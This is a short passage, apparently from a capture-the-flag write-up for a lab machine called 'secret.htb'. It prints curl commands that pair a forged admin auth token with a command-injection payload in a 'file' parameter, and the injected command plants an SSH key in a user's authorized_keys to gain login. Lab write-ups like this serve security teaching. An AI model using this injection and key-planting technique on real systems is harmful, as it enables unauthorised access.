We can get code execution with this payload:

```
curl -XGET 'http://secret.htb:3000/api/logs?file=<URL ENCODED PAYLOAD>' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo"
```

We create a `.ssh` folder and `authorized keys` with our id_rsa.pub

Final payload:

```
curl -XGET 'http://secret.htb:3000/api/logs?file=/home;echo+%22ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABgQCmupLnCHYTjXVR%2Ff0oFfJ4v%2BA1%2BqWtZWQxHIP4yZ7HaPsdMLW%2Bobj7fRCtKHVYaEQVlOiOEbim2BAWcBCOq774MeZ0tTr37e%2FBEXFG7CB8gmFYPpoo1DXkPQwugDqoV6F872V86TnD6wHp3UpTuZxeTwBE80HsvN%2FA7CTSX80MllrEHqyzZ4SgoBMAMr90nXftI8G9UhTK51%2FA05Rhe%2BY7mzwQbXAIz9ObqlxVlY%2BmO7mR4sEI5UtDvN%2BU158NGasyttH5Zf9HXpmfOOPOHOaHA0omDhfmmqp1%2BFmfYPbAJo9%2BVivCs0%2B2Ir0EPrUaOOTCz8ucz740UsiIkKBboJvKIaIGRozaRsIpUD4o3MWqK3iwLNTtF7kknz4TFGpA2E6YnnTX6amtx5ed7mCTGy6KIliTheI9kSYY5T8sYoCc9NyacTm0D6bLzWAg4C0fG1q8d6ir%2FH0tB0Cr5DCShao49WWiGQGvcOp7GuxOFdnl6xtlu87N2XPOQw6PAtqxIwk%3D+keez%40kali%22+%3E%3E+%2Fhome%2Fdasith%2F.ssh%2Fauthorized_keys%3B+chmod+0600+%2Fhome%2Fdasith%2Fauthorized_keys' -H "auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo"
```

We can now ssh in as Dasith